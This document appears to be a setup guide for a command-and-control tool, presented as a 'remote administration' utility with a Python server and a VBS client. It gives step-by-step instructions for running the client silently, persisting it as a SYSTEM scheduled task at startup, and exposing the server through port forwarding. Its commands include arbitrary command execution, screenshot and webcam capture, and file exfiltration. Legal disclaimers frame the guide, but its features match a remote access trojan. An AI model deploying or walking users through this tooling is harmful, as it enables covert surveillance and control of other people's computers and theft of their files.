# Injector Remote Administration Tool - Complete Setup Guide

## 🚨 IMPORTANT LEGAL NOTICE

**READ THIS BEFORE PROCEEDING**

This tool is for **AUTHORIZED USE ONLY** on systems you own or have explicit permission to manage.

Unauthorized use may violate:
- **Computer Fraud and Abuse Act (CFAA)** - United States
- **Computer Misuse Act** - United Kingdom  
- **Similar cybercrime laws** in your jurisdiction
- **Ethical guidelines** and professional codes of conduct

**By using this tool, you agree to use it legally and responsibly.**

---

## 📋 Quick Start Guide

### For the Impatient (5 Minute Setup)

#### 1. Server Setup (1 minute)
```bash
# On your control machine (Windows/Linux/macOS)
cd injector-remote-admin
python injector_server.py
```

#### 2. Client Setup (1 minute per machine)
```cmd
:: On each Windows machine you want to manage
:: Copy remote_admin.vbs to the target machine
cscript remote_admin.vbs http://your-server-ip:8080
```

#### 3. Start Managing (3 minutes)
- Use the server's interactive menu
- Send commands to clients
- View results in real-time

---

## 🏗️ Detailed Setup Guide

## Part 1: Server Setup

### Step 1: Prerequisites

#### Operating System
- ✅ Windows 10/11
- ✅ Windows Server 2016/2019/2022
- ✅ Linux (Ubuntu, CentOS, Debian, etc.)
- ✅ macOS

#### Python Installation

**Windows:**
1. Download Python from: https://www.python.org/downloads/
2. Run the installer
3. **IMPORTANT:** Check "Add Python to PATH" during installation
4. Verify installation:
   ```cmd
   python --version
   pip --version
   ```

**Linux/macOS:**
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install python3 python3-pip

# CentOS/RHEL
sudo yum install python3 python3-pip

# macOS (using Homebrew)
brew install python

# Verify
python3 --version
pip3 --version
```

### Step 2: Download Injector

**Option A: Git Clone (Recommended)**
```bash
git clone https://github.com/your-repo/injector-remote-admin.git
cd injector-remote-admin
```

**Option B: Manual Download**
1. Download the ZIP file from the repository
2. Extract to a folder of your choice
3. Open command prompt in that folder

**Option C: Direct Download**
```bash
# Linux/macOS
wget https://github.com/your-repo/injector-remote-admin/archive/refs/heads/main.zip
unzip main.zip
cd injector-remote-admin-main

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/your-repo/injector-remote-admin/archive/refs/heads/main.zip" -OutFile "injector.zip"
Expand-Archive -Path "injector.zip" -DestinationPath "."
cd injector-remote-admin-main
```

### Step 3: Verify Files

You should have the following files:
```
injector-remote-admin/
├── injector_server.py      # Main server
├── remote_admin.vbs       # Client script
├── client_manager.py      # Client management utility
├── test_connection.py     # Connection test tool
├── setup.bat              # Windows setup script
├── requirements.txt        # Python requirements
├── README.md              # Documentation
└── SETUP_GUIDE.md         # This guide
```

### Step 4: Create Directory Structure

The server will create these directories automatically, but you can create them manually:

```bash
# Windows
mkdir uploads
mkdir downloads
mkdir screenshots
mkdir webcam

# Linux/macOS
mkdir uploads downloads screenshots webcam
```

### Step 5: Start the Server

```bash
# Default port (8080)
python injector_server.py

# Custom port
python injector_server.py 8081

# With specific host (for remote access)
python injector_server.py 8080
```

**Expected Output:**
```
  _____ _           _   _____                      _   
 |  ___| | ___  ___| |_|_   _|__ _ __ ___  ___  __| |  
 | |_  | |/ _ \/ __| __|| |/ _ \ '_ ` _ ` _ \/ _ \/ _` |  
 |  _| | |  __/ (__| |_ | |  __/ | | | | | | | __/ (_| |  
 |_|   |_|\___|\___|\__||_|\___|_| |_| |_| |_|\___|\__,_|  

================================================================================
Injector Remote Administration Tool
Server running on port 8080
================================================================================

[*] Server started on port 8080
[*] Access the server at: http://0.0.0.0:8080
MAIN MENU:
1. Send command to specific PC
2. Send command to all PCs
3. View command results
4. View screenshots
5. View webcam images
6. Upload file to PC
7. Download file from PC
8. Exit
```

### Step 6: Test Server

Open a new terminal and run:
```bash
python test_connection.py http://localhost:8080
```

**Expected Output:**
```
[*] Testing connection to: http://localhost:8080
[+] Server is reachable
[+] Registration endpoint working
[+] Command endpoint working
[+] Ping endpoint working

Test Summary:
  [PASS] Server Connection
  [PASS] Registration Endpoint
  [PASS] Command Endpoint
  [PASS] Ping Endpoint

Results: 4/4 tests passed
[+] All tests passed! Server is ready.
```

---

## Part 2: Client Setup

### Step 1: Deploy Client Script

#### Method A: Manual Deployment
1. Copy `remote_admin.vbs` to the target Windows machine
2. Place it in a permanent location (e.g., `C:\Injector\`)

#### Method B: Network Share
1. Create a network share on your server
2. Place `remote_admin.vbs` in the share
3. On client machines, map a drive or access via UNC path

#### Method C: Using Client Manager
```bash
# Generate customized client
python client_manager.py generate --server http://your-server-ip:8080 --name Office_PC_01

# Create deployment package
python client_manager.py package --name Office_PC_01 --output office_pc_01.zip
```

### Step 2: Run the Client

#### Option 1: Double-Click
- Simply double-click `remote_admin.vbs`
- Uses default server URL: `http://localhost:8080`

#### Option 2: Command Line
```cmd
:: Connect to local server
cscript remote_admin.vbs

:: Connect to remote server
cscript remote_admin.vbs http://192.168.1.100:8080

:: Run silently (no window)
wscript remote_admin.vbs http://192.168.1.100:8080
```

#### Option 3: Scheduled Task (Auto-Start)

**Create a scheduled task to run on startup:**

1. Open Task Scheduler
2. Create Task:
   - Name: `Injector Client`
   - Trigger: `At startup`
   - Action: `Start a program`
   - Program: `wscript.exe`
   - Arguments: `"C:\Injector\remote_admin.vbs" http://your-server-ip:8080`
   - Run whether user is logged on or not
   - Run with highest privileges

**Command Line Method:**
```cmd
schtasks /create /tn "Injector Client" /tr "wscript.exe \"C:\Injector\remote_admin.vbs\" http://your-server-ip:8080" /sc onstart /ru SYSTEM /rl HIGHEST
```

### Step 3: Verify Client Connection

1. Check the server console for registration message:
   ```
   [+] New client registered: abc123def456...
       Info: {'hostname': 'OFFICE-PC-01', 'username': 'JohnDoe', 'os': 'Windows 10', 'ip': '192.168.1.50', 'port': 12345}
   ```

2. Use the server menu to view connected clients:
   ```
   [*] Connected Clients (1):
   1. abc123def... - OFFICE-PC-01 (JohnDoe) @ 192.168.1.50
   ```

---

## Part 3: Dependency Installation

### For Screenshot Capture

#### Option A: nircmd.exe (Recommended)

1. Download from: https://www.nirsoft.net/utils/nircmd.html
2. Extract `nircmd.exe`
3. Place in one of these locations:
   - `C:\Windows\`
   - `C:\Windows\System32\`
   - Any directory in system PATH

**Verify Installation:**
```cmd
nircmd.exe version
```

#### Option B: PowerShell Fallback

- No installation required
- Works on Windows 7+
- Slower than nircmd.exe

### For Webcam Capture

#### Option A: FFmpeg (Recommended)

1. Download from: https://ffmpeg.org/download.html
2. Choose Windows build from: https://www.gyan.dev/ffmpeg/builds/
3. Extract and add to system PATH

**Verify Installation:**
```cmd
ffmpeg -version
```

#### Option B: DirectShow (PowerShell)

- Built into Windows 10+
- No additional installation required
- Limited functionality on older Windows versions

#### Option C: fswebcam (Linux/WSL)

```bash
# Ubuntu/Debian
sudo apt install fswebcam

# CentOS/RHEL
sudo yum install fswebcam
```

---

## Part 4: Network Configuration

### Firewall Configuration

#### Server Firewall

**Windows:**
```cmd
:: Allow incoming connections on port 8080
netsh advfirewall firewall add rule name="Injector Server" dir=in action=allow protocol=TCP localport=8080

:: Verify
netsh advfirewall firewall show rule name="Injector Server"
```

**Linux:**
```bash
# Allow port 8080
sudo ufw allow 8080/tcp

# Enable firewall
sudo ufw enable

# Verify
sudo ufw status
```

**macOS:**
```bash
# Allow incoming connections
sudo pfctl -ef /etc/pf.conf

# Or use System Preferences > Security & Privacy > Firewall
```

#### Client Firewall

**Windows:**
```cmd
:: Allow outgoing connections to server
netsh advfirewall firewall add rule name="Injector Client" dir=out action=allow protocol=TCP remoteport=8080
```

### Router Configuration (For Remote Access)

1. **Port Forwarding:**
   - Forward port 8080 to your server's local IP
   - Example: External port 8080 → Internal IP 192.168.1.100:8080

2. **Static IP:**
   - Assign a static IP to your server on the local network

3. **Dynamic DNS (Optional):**
   - Use services like No-IP or DynDNS if you don't have a static public IP

### Security Considerations

**⚠️ WARNING: The server has no authentication by default!**

For production use, consider:

1. **Network Isolation:**
   - Run server on a separate VLAN
   - Use firewall rules to restrict access

2. **VPN Access:**
   - Only allow connections from VPN
   - Use OpenVPN, WireGuard, or similar

3. **IP Whitelisting:**
   - Modify the server to only accept connections from specific IPs

4. **HTTPS:**
   - Use SSL/TLS for encrypted communication
   - Requires certificate setup

---

## Part 5: Using the Tool

### Server Interface Navigation

#### Main Menu Options

```
MAIN MENU:
1. Send command to specific PC
2. Send command to all PCs
3. View command results
4. View screenshots
5. View webcam images
6. Upload file to PC
7. Download file from PC
8. Exit
```

#### Option 1: Send Command to Specific PC

1. Select option 1
2. Choose a client from the list
3. Select a command
4. Provide any required arguments
5. Command is sent to the client

**Example:**
```
[?] Select client (number or ID, 'all' for all, 'back' to cancel):
>> 1

[?] Select command (name or 'back' to cancel):
>> sysinfo

[*] Command queued for abc123def...: sysinfo
[+] Command sent successfully
```

#### Option 2: Send Command to All PCs

1. Select option 2
2. Select a command
3. Provide any required arguments
4. Command is sent to all connected clients

**Example:**
```
[?] Select command (name or 'back' to cancel):
>> msg

[?] Enter message:
>> Server maintenance in 5 minutes

[*] Command sent to all 3 clients: msg
[+] Command sent successfully
```

#### Option 3: View Command Results

1. Select option 3
2. Choose a client or 'all' for all clients
3. View results with timestamps

**Example:**
```
[?] Select client (number or ID, 'all' for all, 'back' to cancel):
>> all

Results for All Clients:

Result 1 - 2024-12-15 14:30:22:
  Command ID: 1
  Result: System Information:
          ==================
          Hostname: OFFICE-PC-01
          Username: JohnDoe
          OS: Windows 10
          ...
------------------------------------------------------------

Result 2 - 2024-12-15 14:31:05:
  Command ID: 2
  Result: Command Output:
          ipconfig /all
          
          Windows IP Configuration
          ...
------------------------------------------------------------
```

#### Option 4: View Screenshots

1. Select option 4
2. Browse available screenshots
3. Select a screenshot to view or open the directory

**Example:**
```
Available Screenshots:
1. screenshot_20241215_143022_abc123def.png (123456 bytes, 2024-12-15 14:30:22)
2. screenshot_20241215_143545_abc123def.png (234567 bytes, 2024-12-15 14:35:45)

[?] Enter number to view, 'open' to open directory, or 'back':
>> open
```

#### Option 5: View Webcam Images

1. Select option 5
2. Browse available webcam images
3. Select an image to view or open the directory

#### Option 6: Upload File to PC

1. Select option 6
2. Choose a client
3. Select a file from the `uploads/` directory
4. File is sent to the client

**Example:**
```
Available Files in uploads:
1. script.ps1 (1234 bytes)
2. config.txt (567 bytes)

[?] Select file to upload (number or filename):
>> 1

[+] File upload command sent to abc123def...
```

#### Option 7: Download File from PC

1. Select option 7
2. Choose a client
3. Enter the file path on the client
4. File is downloaded to the `downloads/` directory

**Example:**
```
[?] Enter path of file to download from client:
>> C:\Users\JohnDoe\Documents\report.docx

[+] File download command sent to abc123def...
[*] Check the downloads directory for the file
```

### Available Commands Reference

| Command | Description | Example | Notes |
|---------|-------------|---------|-------|
| `sysinfo` | System information | `sysinfo` | CPU, RAM, OS, etc. |
| `processes` | Running processes | `processes` | List all processes |
| `drives` | Drive information | `drives` | List all drives |
| `dir` | Directory listing | `dir C:\Users` | List files/folders |
| `exec` | Execute command | `exec ipconfig /all` | Any shell command |
| `runas` | Run as admin | `runas net user` | Requires UAC |
| `msg` | Show message | `msg Hello!` | Popup message |
| `screenshot` | Capture screen | `screenshot` | Uses nircmd/PowerShell |
| `webcam` | Capture webcam | `webcam` | Uses FFmpeg/DirectShow |
| `reboot` | Reboot system | `reboot` | ⚠️ Destructive |
| `shutdown` | Shutdown system | `shutdown` | ⚠️ Destructive |
| `logoff` | Log off user | `logoff` | ⚠️ Destructive |

---

## Part 6: Advanced Configuration

### Customizing the Server

Edit `injector_server.py` to customize settings:

```python
# Change port
DEFAULT_PORT = 8080

# Change directories
UPLOADS_DIR = "uploads"
DOWNLOADS_DIR = "downloads"
SCREENSHOTS_DIR = "screenshots"
WEBCAM_DIR = "webcam"

# Change colors
class Colors:
    HEADER = '\033[95m'    # Purple
    OKBLUE = '\033[94m'    # Blue
    OKGREEN = '\033[92m'   # Green
    WARNING = '\033[93m'   # Yellow
    FAIL = '\033[91m'      # Red
```

### Customizing the Client

Edit `remote_admin.vbs` to customize settings:

```vbs
' Change default server URL
Const SERVER_URL = "http://localhost:8080"

' Change temporary directory
Const TEMP_DIR = "injector_temp"

' Change file names
Const SCREENSHOT_FILE = "injector_screenshot.png"
Const WEBCAM_FILE = "injector_webcam.jpg"
```

### Adding Custom Commands

To add a custom command to the server:

1. Add to the commands dictionary in `injector_server.py`:
```python
self.commands = {
    # ... existing commands ...
    'mycommand': {'desc': 'My custom command', 'args': {'param1': str}},
}
```

2. Add the command handler in `remote_admin.vbs`:
```vbs
Case "mycommand"
    result = MyCustomCommand(args)
```

3. Implement the function:
```vbs
Function MyCustomCommand(args)
    Dim param1
    param1 = ExtractValue(args, "param1")
    ' ... your code ...
    MyCustomCommand = "Result: " & param1
End Function
```

---

## Part 7: Troubleshooting

### Common Issues and Solutions

#### Server Issues

| Issue | Solution |
|-------|----------|
| Port already in use | Change port or stop conflicting service |
| Permission denied | Run with administrator privileges |
| Module not found | Install required Python modules |
| Connection refused | Check firewall settings |
| No clients connecting | Verify network connectivity |

**Check Server Logs:**
```bash
# View server output for errors
tail -f server.log  # If logging is enabled
```

#### Client Issues

| Issue | Solution |
|-------|----------|
| Cannot connect to server | Verify server URL and network connectivity |
| Screenshot capture fails | Install nircmd.exe or enable PowerShell |
| Webcam capture fails | Install FFmpeg or check camera permissions |
| Command execution fails | Check user permissions on client |
| Client not registering | Check if client ID file is writable |

**Check Client Logs:**
- The client outputs to the console when run with `cscript`
- For silent mode, check Windows Event Viewer

#### Network Issues

| Issue | Solution |
|-------|----------|
| Connection timeout | Check firewall on both server and client |
| DNS resolution fails | Use IP address instead of hostname |
| Port blocked | Configure port forwarding on router |
| SSL errors | Use HTTP instead of HTTPS (or configure certificates) |

**Test Network Connectivity:**
```cmd
:: Test basic connectivity
ping 192.168.1.100

:: Test port connectivity
telnet 192.168.1.100 8080

:: Test with curl
curl http://192.168.1.100:8080/ping?id=test
```

### Debug Mode

**Server Debug:**
Add debug logging to `injector_server.py`:
```python
def log_debug(message):
    print(f"{Colors.OKBLUE}[DEBUG] {message}{Colors.ENDC}")
```

**Client Debug:**
Run the client with `cscript` to see output:
```cmd
cscript remote_admin.vbs http://your-server-ip:8080
```

---

## Part 8: Security Best Practices

### ⚠️ IMPORTANT: Default Configuration is Insecure

The tool is designed for **authorized use in controlled environments**. For production use, implement these security measures:

### 1. Network Security

**Do:**
- Run server on internal network only
- Use firewall rules to restrict access
- Consider using a separate VLAN

**Don't:**
- Expose the server to the internet without protection
- Allow connections from untrusted networks
- Use default port without firewall rules

### 2. Authentication

**Implement:**
- HTTP Basic Authentication
- Client certificates
- API keys for client registration

**Example (Python):**
```python
# Add to injector_server.py
import base64
from functools import wraps

def require_auth(func):
    @wraps(func)
    def wrapper(self, *args, **kwargs):
        auth_header = self.headers.get('Authorization')
        if not auth_header:
            self.send_error(401, "Unauthorized")
            return
        
        auth_type, auth_string = auth_header.split(' ')
        username, password = base64.b64decode(auth_string).decode().split(':')
        
        if username != 'admin' or password != 'securepassword':
            self.send_error(401, "Unauthorized")
            return
        
        return func(self, *args, **kwargs)
    return wrapper

# Apply to endpoints
class InjectorRequestHandler(BaseHTTPRequestHandler):
    @require_auth
    def do_GET(self):
        # ... existing code ...
```

### 3. Encryption

**Use:**
- HTTPS instead of HTTP
- TLS/SSL certificates
- Encrypt sensitive data

**Example (HTTPS Server):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

# Create SSL context
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('server.crt', 'server.key')

# Start HTTPS server
server = HTTPServer(('0.0.0.0', 8443), InjectorRequestHandler)
server.socket = context.wrap_socket(server.socket, server_side=True)
server.serve_forever()
```

### 4. Authorization

**Implement:**
- Client whitelisting
- IP-based access control
- Role-based permissions

**Example (IP Whitelisting):**
```python
ALLOWED_IPS = ['192.168.1.0/24', '10.0.0.0/8']

def is_allowed(ip):
    for allowed in ALLOWED_IPS:
        if ip.startswith(allowed.rsplit('.', 1)[0]):
            return True
    return False

# In do_GET method
client_ip = self.client_address[0]
if not is_allowed(client_ip):
    self.send_error(403, "Forbidden")
    return
```

### 5. Logging and Monitoring

**Enable:**
- Detailed logging
- Client connection monitoring
- Alerts for suspicious activity

**Example (Logging):**
```python
import logging

logging.basicConfig(
    filename='injector.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Log client connections
logging.info(f"New client connection from {self.client_address[0]}")
```

---

## Part 9: Performance Optimization

### Server Performance

**Thread Pool:**
- The server uses threading for concurrent connections
- Each client connection runs in a separate thread
- Limited by system resources

**Command Queue:**
- Commands are queued per client
- Processed sequentially to avoid conflicts
- Results stored in memory

**Memory Usage:**
- Results are cleared after viewing
- Temporary files are cleaned up automatically
- Consider adding memory limits for large file transfers

### Client Performance

**Polling Interval:**
- Client polls for commands every 2 seconds
- Adjustable in `remote_admin.vbs`

**Heartbeat:**
- Client sends ping every 5 seconds
- Helps detect disconnected clients

**Cleanup:**
- Temporary files cleaned up automatically
- Old files removed after 1 hour

### Scalability

**Maximum Clients:**
- Limited by system resources
- Thread pool size can be adjusted
- Consider using async I/O for better scalability

**Command Throughput:**
- Depends on network latency
- Client processing speed
- Server load

**File Transfer:**
- Base64 encoding adds ~33% overhead
- Consider chunked transfer for large files
- Compression can reduce transfer size

---

## Part 10: Maintenance

### Regular Maintenance Tasks

1. **Clean Up Old Files:**
   ```bash
   # Remove files older than 7 days
   find uploads/ downloads/ screenshots/ webcam/ -type f -mtime +7 -delete
   ```

2. **Monitor Server Logs:**
   ```bash
   # View recent logs
   tail -n 100 injector.log
   ```

3. **Check Client Connections:**
   - Use the server menu to view connected clients
   - Remove inactive clients

4. **Update Dependencies:**
   - Keep nircmd.exe and FFmpeg updated
   - Check for Python updates

### Backup Configuration

1. **Backup Server Files:**
   ```bash
   # Create backup
   tar -czvf injector_backup_$(date +%Y%m%d).tar.gz injector-remote-admin/
   ```

2. **Backup Client Configurations:**
   - Backup `client_config.json`
   - Backup deployment directories

### Version Updates

1. **Check for Updates:**
   - Visit the repository regularly
   - Check for new features and bug fixes

2. **Update Process:**
   ```bash
   # Pull latest changes
   git pull origin main
   
   # Or download new version
   wget https://github.com/your-repo/injector-remote-admin/archive/refs/heads/main.zip
   ```

---

## 📞 Support and Resources

### Documentation
- `README.md` - Main documentation
- `SETUP_GUIDE.md` - This comprehensive setup guide

### Community
- GitHub Issues: Report bugs and request features
- GitHub Discussions: Ask questions and share experiences

### Troubleshooting
- Check the Troubleshooting section above
- Enable debug logging
- Review server and client logs

### Legal
- This tool is for authorized use only
- Use responsibly and legally
- Respect privacy and ethical guidelines

---

## 🎯 Quick Reference

### Server Commands
```bash
# Start server
python injector_server.py [port]

# Test connection
python test_connection.py [server_url]

# Generate client
python client_manager.py generate --server [url] --name [name]

# Create package
python client_manager.py package --name [name] --output [file.zip]

# Configure
python client_manager.py config
```

### Client Commands
```cmd
:: Run client
cscript remote_admin.vbs [server_url]

:: Run silently
wscript remote_admin.vbs [server_url]

:: Create scheduled task
schtasks /create /tn "Injector Client" /tr "wscript.exe \"C:\path\to\remote_admin.vbs\" [server_url]" /sc onstart /ru SYSTEM /rl HIGHEST
```

### Common Commands
| Action | Command |
|--------|---------|
| System Info | `sysinfo` |
| Processes | `processes` |
| Drives | `drives` |
| Directory | `dir C:\path` |
| Execute | `exec command` |
| Message | `msg "Hello"` |
| Screenshot | `screenshot` |
| Webcam | `webcam` |
| Reboot | `reboot` |
| Shutdown | `shutdown` |
| Logoff | `logoff` |

---

## 🏁 Conclusion

You now have a fully functional remote administration tool! Remember:

1. **Use Responsibly** - Only on systems you own or have permission to manage
2. **Secure Your Setup** - Implement authentication and encryption for production use
3. **Monitor Regularly** - Keep an eye on client connections and server logs
4. **Stay Updated** - Check for updates and security patches

For questions, issues, or suggestions, refer to the documentation or create a GitHub issue.

**Happy (and legal) administering!**

---

*Last updated: December 2024*
*Version: 1.0.0*